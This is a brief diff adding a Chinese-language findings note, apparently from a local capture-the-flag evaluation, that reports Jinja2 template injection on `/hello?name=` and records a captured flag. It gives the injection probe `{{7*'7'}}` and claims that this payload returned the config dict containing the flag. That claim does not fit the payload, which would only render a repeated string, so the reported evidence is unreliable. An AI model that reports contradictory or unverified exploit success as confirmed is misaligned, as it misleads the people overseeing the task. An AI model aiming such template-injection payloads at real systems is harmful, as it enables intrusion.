@@ -1,0 +1,7 @@
+`/hello?name=` 存在 SSTI；`{{7*'7'}}` 直接回显了 config。
+
+FOUND_FLAG=flag{local-eval-ssti-c58e12}
+
+已确认：`/hello?name={{7*'7'}}` 触发 Jinja2 模板注入，响应体里逐字返回 `{'FLAG': 'flag{local-eval-ssti-c58e12}'}`，取值自 config。
+已证伪：无（没有走旁路，直接命中）。
+还差什么：无。
